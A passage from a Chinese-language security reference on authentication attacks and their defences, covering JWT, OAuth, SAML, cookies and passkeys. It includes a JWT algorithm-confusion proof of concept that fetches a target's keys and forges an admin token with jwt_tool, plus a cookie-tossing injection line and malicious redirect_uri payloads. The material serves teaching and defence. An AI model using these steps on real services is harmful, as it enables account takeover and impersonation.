    └── 前端硬编码 → JS 代码审计
```

### 19. 2025-2026 防御演进总结

```
认证安全演进方向
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
密码认证 → Passkey/FIDO2 (无密码、抗钓鱼)
推送 MFA → 号码匹配 + 风险自适应 → FIDO2
Implicit Flow → Authorization Code + PKCE
手动密钥管理 → 自动轮换 + DPoP 绑定
SAML XML 解析 → 统一解析器 + 严格验证
API Key 硬编码 → 密钥管理服务 (KMS) + 临时凭证
JWT 算法信任 → 算法白名单硬编码
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

关键原则:
1. 永远不信任客户端声明的算法类型
2. 所有 token 必须有明确的生命周期和轮换机制
3. 认证凭证与上下文（设备/位置/IP）绑定
4. 纵深防御: 不依赖单一认证因素
5. 持续监控: 异常认证行为实时告警
```

---

### 20. CVE-2025-55241 — Microsoft Entra ID 跨租户身份冒充（CVSS 10.0）

2025 年最严重的认证漏洞之一。Microsoft 于 **2025-07-17** 紧急修复。

#### 20.1 漏洞原理

- **根因**: Entra ID 中的 **legacy token** + **Actor token**（服务到服务后端认证）处理缺陷
- **影响**: 攻击者可跨租户冒充**任意用户**，包括 Global Admin
- **范围**: 所有使用 Entra ID 作为 SSO / 认证的 Microsoft 云服务

#### 20.2 利用模型

```
1. 攻击者拥有任意 Azure 租户的普通账号
2. 通过 legacy Graph endpoint 请求 Actor token
3. 篡改 Actor token 中的目标用户标识
4. 跨租户访问目标租户的 Graph API
5. 等同于 Global Admin 权限，完全接管租户
```

#### 20.3 影响

- **CVSS 10.0**（满分）
- 可访问全球所有使用 Entra ID 的 Azure 租户
- 完全 MFA 绕过（因为攻击者持有合法 token）

#### 20.4 防御

- 应用 2025-07 补丁（Microsoft 自动推送，但自托管集成应用需手动更新）
- 禁用 legacy token 端点
- 监控跨租户 Actor token 异常使用
- 启用 Entra ID 的 Conditional Access + Sign-in Risk Policy

**参考**:
- [The Hacker News — Microsoft Patches Critical Entra ID Flaw](https://thehackernews.com/2025/09/microsoft-patches-critical-entra-id.html)
- [Gopher Security — Tenant-Wide Compromise](http://www.gopher.security/news/critical-azure-entra-id-vulnerability-allows-tenant-wide-compromise)
- [CyberMaxx — CVE-2025-55241 Emergency Fix](https://www.cybermaxx.com/resources/critical-entra-id-vulnerability-cve-2025-55241-microsoft-issues-emergency-fix-for-cross-tenant-token-exploit/)

---

### 21. 2025-2026 JWT 最新 CVE 与绕过

#### 21.1 CVE-2025-59934 — Formbricks JWT 签名绕过

- **影响**: Formbricks 应用（用户反馈平台）
- **漏洞**: JWT 签名验证不当，攻击者可伪造任意用户身份
- **参考**: [SentinelOne CVE-2025-59934](https://www.sentinelone.com/vulnerability-database/cve-2025-59934/)

#### 21.2 CVE-2025-45768 — PyJWT v2.10.1 弱加密

- **影响**: PyJWT 2.10.1 及之前
- **漏洞**: 弱加密导致签名可被绕过
- **修复**: 升级至 PyJWT ≥ 2.10.2
- **参考**: [ZeroPath — CVE-2025-45768](https://zeropath.com/blog/cve-2025-45768-pyjwt-weak-encryption-summary)

#### 21.3 CVE-2025-30144 — fast-jwt

- **影响**: Node.js fast-jwt 库
- **参考**: [NVD CVE-2025-30144](https://nvd.nist.gov/vuln/detail/CVE-2025-30144)

#### 21.4 JWT 算法混淆攻击 — 2025 完整指南

[PortSwigger — Algorithm Confusion](https://portswigger.net/web-security/jwt/algorithm-confusion) + [WorkOS — JWT Algorithm Confusion](https://workos.com/blog/jwt-algorithm-confusion-attacks)：

**攻击原理**:
```
1. 服务器同时支持 RS256（非对称）和 HS256（对称）
2. 攻击者获取服务器的 RSA 公钥（通常在 /jwks.json 或 /.well-known/jwks.json）
3. 把公钥作为 HS256 的密钥
4. 用此密钥签发 JWT，header 中 alg 改为 HS256
5. 服务器看到 alg=HS256，用配置的"密钥"（其实是 RSA 公钥）验证 → 通过
```

**POC 工具链**:
```bash
# 1. 获取目标公钥
curl https://target.com/.well-known/jwks.json > jwks.json

# 2. 转换公钥为 PEM 格式
python3 -c "
import json, base64
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers

jwks = json.load(open('jwks.json'))
key = jwks['keys'][0]
n = int.from_bytes(base64.urlsafe_b64decode(key['n'] + '=='), 'big')
e = int.from_bytes(base64.urlsafe_b64decode(key['e'] + '=='), 'big')
pub = RSAPublicNumbers(e, n).public_key()
from cryptography.hazmat.primitives import serialization
pem = pub.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
open('pub.pem', 'wb').write(pem)
"

# 3. 用 jwt_tool 签发混淆 token
python3 jwt_tool.py JWT_TOKEN -X k -pk pub.pem
# -X k: 算法混淆攻击
# -pk: 公钥文件

# 4. 替换 payload 中的 sub 为 admin
python3 jwt_tool.py JWT_TOKEN -T -I -pc sub -pv admin -X k -pk pub.pem
```

**检测 — Datadog 规则**:
```yaml
# 端点同时接受 HMAC 和 RSA 算法 → 算法混淆前兆
name: jwt-algorithm-confusion-vulnerable-endpoint
queries:
  - alg_header: ["HS256", "HS384", "HS512"]
  - AND alg_header: ["RS256", "PS256", "ES256"]
```

#### 21.5 JWT 防御最新原则（2025-2026）

| 原则 | 实现 |
|------|------|
| **算法白名单硬编码** | 服务端代码固定 `algorithms: ['RS256']`，不接受 header 中的 alg |
| **禁止算法切换** | 不允许同一密钥同时用于 HMAC 和 RSA |
| **JWK / JKU Header 注入防御** | 禁用 `jku`、`jwk`、`kid` 路径穿越 |
| **JWT 库升级** | PyJWT ≥ 2.10.2 / jose ≥ 4.0 / jsonwebtoken ≥ 9.0.2 |
| **JWT 短生命** | Access Token ≤ 15 分钟，Refresh Token 单独管理 |
| **DPoP 绑定** | RFC 9449, Token 与客户端密钥绑定，防重放 |

---

### 22. Cookie Tossing 与 __Host- / __Secure- 前缀绕过

#### 22.1 Cookie Tossing — 跨子域 Cookie 注入

[PortSwigger — Cookie Chaos](https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes) + [thomashouhou — Cookie Tossing](https://www.thomashouhou.com/post/cookie-tossing-attacks/)：

**攻击原理**:
```
1. 攻击者控制子域 attacker.example.com（XSS / 子域名接管）
2. 在子域设置 Cookie: document.cookie = "session=attacker; domain=.example.com; path=/"
3. Cookie 被发送到 example.com 的所有子域
4. 目标应用 example.com 读取 session Cookie → 使用攻击者的 session
```

**OAuth 流程劫持**:
```
1. 攻击者在 OAuth 重定向中找到子域 XSS
2. 抛出 OAuth state Cookie 到 .example.com
3. 用户实际登录时，应用读取攻击者控制的 state
4. 攻击者完成 OAuth code 注入
```

#### 22.2 __Host- 前缀绕过

`__Host-Cookie` 设计上要求：
- Path=/
- Secure
- 无 Domain
- 仅 HTTPS

**绕过场景**:
```
# 子域设置 __Host- cookie（浏览器错误实现）
# 旧版浏览器接受子域设置的 __Host- cookie
# 中间件代理错误处理 Cookie

# 解决方案: 升级浏览器 + 严格 CSP
```

#### 22.3 防御

```http
# 严格 Cookie 配置
Set-Cookie: __Host-session=xxx; Path=/; Secure; HttpOnly; SameSite=Strict

# 子域隔离
# 关键应用使用独立根域名（如 accounts.example.com 而非 example.com/accounts）

# 子域监控
# 定期扫描 subdomain takeover 风险
```

**参考**:
- [Snyk Labs — Hijacking OAuth via Cookie Tossing](https://labs.snyk.io/resources/hijacking-oauth-flows-via-cookie-tossing/)
- [HackTricks — Cookie Tossing](https://hacktricks.wiki/en/pentesting-web/hacking-with-cookies/cookie-tossing.html)
- [Seraphic Security — Session Hijacking 2025](https://seraphicsecurity.com/learn/website-security/session-hijacking-in-2025-techniques-attack-examples-and-defenses/)

---

### 23. OAuth 2.1 / PKCE Downgrade 攻击（2025）

#### 23.1 PKCE Downgrade

[Doyensec — Common OAuth Vulnerabilities (2025-01)](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)：

**漏洞模式**:
```
1. OAuth 服务器支持 PKCE 但不强制
2. 攻击者发起 Authorization Code 流程，省略 code_challenge / code_verifier
3. 受害者被钓鱼点击授权链接
4. Authorization Code 被攻击者拦截
5. 攻击者用此 code 完成登录（无 PKCE 校验）

# === 正确做法（OAuth 2.1）===
# 服务器必须强制 PKCE，不接受无 code_challenge 的请求
```

#### 23.2 Authorization Code Injection

[Anador — Authorization Code Injection](https://medium.com/@anador/attacks-via-a-new-oauth-flow-authorization-code-injection-and-whether-httponly-pkce-and-bff-3db1624b4fa7)：

**新型攻击**:
```
1. 攻击者发起 OAuth 流程，获取 Authorization Code（自己账户的）
2. 攻击者把 code 注入到受害者的会话中（通过钓鱼链接）
3. 受害者浏览器完成 OAuth，code 被提交到 callback 端点
4. 服务器认为受害者已通过认证 → 绑定攻击者账户到受害者会话
5. 攻击者用自己账户登录 → 访问受害者数据

# === 防御 ===
# state 参数严格绑定会话
# DPoP / mTLS 绑定 code 到客户端
# BFF（Backend For Frontend）模式
```

#### 23.3 Redirect URI 操纵

[IntelligenceX — OAuth Misconfiguration](https://blog.intelligencex.org/oauth-misconfiguration-vulnerabilities-attacks-prevention-guide)：

```
# 常见配置错误
# 1. 通配符 redirect_uri:
redirect_uri=https://*.example.com/callback
# 攻击者: https://attacker.example.com/callback（如果有子域 XSS）

# 2. 路径绕过
redirect_uri=https://example.com/callback/../../../attacker
redirect_uri=https://example.com/callback?next=//attacker.com

# 3. 协议混淆
redirect_uri=javascript:alert(1)//example.com
redirect_uri=https://example.com/callback#@attacker.com
```

#### 23.4 OAuth 2.1 关键变更

| 变更 | 说明 |
|------|------|
| **强制 PKCE** | 所有 Authorization Code 流程必须用 PKCE |
| **废弃 Implicit Flow** | 不再支持 response_type=token |
| **废弃 ROPC** | 不再支持 Resource Owner Password Credentials |
| **强制精确 redirect_uri 匹配** | 不允许通配符 |
| **Bearer Token 防御** | 推荐 DPoP / mTLS 绑定 |
| **State 参数强制** | 防 CSRF |

---

### 24. Passkey / FIDO2 最新攻击研究（2025）

#### 24.1 Synced vs Device-Bound Passkey

[arXiv — Device-Bound vs Synced Passkey](https://arxiv.org/html/2501.07380v1) 关键发现：

| 类型 | 优势 | 风险 |
|------|------|------|
| **Synced Passkey**（Apple/Google/Microsoft）| 跨设备同步 | 云账户被劫持 = 全部 passkey 被劫持 |
| **Device-Bound Passkey**（企业级） | 不离开设备 | 设备丢失 = 失去访问 |

**Synced Passkey 攻击场景**:
- 攻击者窃取 Apple ID / Google 账户 → 恢复所有同步的 passkey
- SIM swap → 重置云账户密码 → 恢复 passkey
- 内部威胁：云服务员工理论上可访问

#### 24.2 MFA Fallback 攻击

[WorkOS — Passkeys Stop Phishing, MFA Fallbacks Undo It](https://workos.com/blog/passkeys-stop-ai-phishing-mfa-fallbacks)：

**漏洞模式**:
```
1. 应用支持 Passkey + SMS/Email 代码作为 fallback
2. 攻击者发起 AiTM 钓鱼（如 Evilginx）
3. 用户被钓鱼，但应用因 Passkey 失败/取消而 fallback 到 SMS
4. SMS 被 SIM swap 截获
5. 完整账户接管

# === 防御 ===
# 1. Fallback 不能降低安全等级（不应 fallback 到 SMS）
# 2. 检测 Passkey 取消模式（异常取消 → 风险评分）
# 3. AI 增强钓鱼检测（Passkey 不会泄露给钓鱼站）
```

#### 24.3 AiTM 对 Microsoft Authenticator Passkey

[Reddit — MS Authenticator AiTM Attacks](https://www.reddit.com/r/cybersecurity/comments/1khngni/ms_authenticator_passkeys_aitm_attacks/)：
- MS Authenticator Passkey 在某些配置下仍可被 AiTM 中继
- 关键：必须在 Relying Party 端启用 **Origin binding** 和 **Attestation**

#### 24.4 Passkey 部署清单（2026）

| 检查项 | 状态 |
|--------|------|
| 使用 FIDO2 Server（自建或云服务） | ✅ |
| 严格 Origin binding | ✅ |
| 启用 Attestation（高安全场景） | ✅ |
| Fallback 不降级到 SMS/Email | ✅ |
| 检测异常 Passkey 取消 | ✅ |
| 监控 Passkey 注册/删除 | ✅ |
| 用户教育（不共享 Passkey） | ✅ |
| Synced vs Device-Bound 按场景选择 | ✅ |

---

### 25. 2025-2026 综合 CVE 速查（认证类）

| CVE | 产品 | 影响 | 来源 |
|------|------|------|------|
| **CVE-2025-55241** | Microsoft Entra ID | 跨租户身份冒充（CVSS 10.0） | [Hacker News](https://thehackernews.com/2025/09/microsoft-patches-critical-entra-id.html) |
| CVE-2025-59934 | Formbricks | JWT 签名绕过 | [SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2025-59934/) |
| CVE-2025-45768 | PyJWT 2.10.1 | 弱加密 | [ZeroPath](https://zeropath.com/blog/cve-2025-45768-pyjwt-weak-encryption-summary) |
| CVE-2025-30144 | fast-jwt (Node.js) | JWT 漏洞 | [NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-30144) |
| CVE-2025-47949 | samlify (Node.js) | SSO 绕过 | [Endor Labs](https://www.endorlabs.com/learn/cve-2025-47949-reveals-flaw-in-samlify-that-opens-door-to-saml-single-sign-on-bypass) |
| CVE-2026-28809 | esaml (SAML 库) | XXE | SentinelOne |
| CVE-2025-55296 | LibreNMS ≤25.6.0 | 存储 XSS + 认证绕过 | Aliyun AVD |

---

### 26. 中文社区精华

#### 26.1 奇安信攻防社区

- 持续关注 [奇安信攻防社区](https://forum.butian.net/community/all) 的漏洞分析与复现板块
- 奇安信代码安全实验室的 JWT / OAuth / SAML 漏洞研究

#### 26.2 跳跳糖 / 阿里云 / 腾讯云

- [跳跳糖 — 服务器端模板注入 SSTI 分析与归纳](https://tttang.com/archive/1412/)
- [阿里云开发者社区 — Java 安全之 Thymeleaf 模板注入漏洞](https://developer.aliyun.com/article/1235821)
- 阿里云漏洞库 (avd.aliyun.com) 实时 CVE 更新

#### 26.3 国际参考（深度阅读）

- [PortSwigger — JWT Algorithm Confusion](https://portswigger.net/web-security/jwt/algorithm-confusion)
- [PortSwigger — Cookie Chaos (__Host- bypass)](https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes)
- [PortSwigger — OAuth Vulnerabilities](https://portswigger.net/web-security/oauth)
- [PortSwigger — SAML Burp Suite Extension](https://portswigger.net/bappstore/c61b2d5ed00a4a54a68b5f8e5f54ba4e)
- [Doyensec — Common OAuth Vulnerabilities 2025](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [WorkOS — JWT Algorithm Confusion Attacks](https://workos.com/blog/jwt-algorithm-confusion-attacks)
- [WorkOS — Passkeys vs MFA Fallback](https://workos.com/blog/passkeys-stop-ai-phishing-mfa-fallbacks)
- [Auth0 — State vs Nonce vs PKCE](https://auth0.com/blog/demystifying-oauth-security-state-vs-nonce-vs-pkce/)
- [IETF — Cross-Device OAuth Security](https://datatracker.ietf.org/doc/draft-ietf-oauth-cross-device-security/13/)
- [arXiv — Synced vs Device-Bound Passkey](https://arxiv.org/html/2501.07380v1)
- [PentesterLab — JWT Vulnerabilities Guide](https://pentesterlab.com/blog/jwt-vulnerabilities-attacks-guide)
- [IntelligenceX — JWT Vulnerabilities 2025](https://blog.intelligencex.org/jwt-vulnerabilities-testing-guide-2025-algorithm-confusion)
- [thomashouhou — Cookie Tossing](https://www.thomashouhou.com/post/cookie-tossing-attacks/)
- [Snyk Labs — OAuth Cookie Tossing](https://labs.snyk.io/resources/hijacking-oauth-flows-via-cookie-tossing/)
- [Seraphic Security — Session Hijacking 2025](https://seraphicsecurity.com/learn/website-security/session-hijacking-in-2025-techniques-attack-examples-and-defenses/)
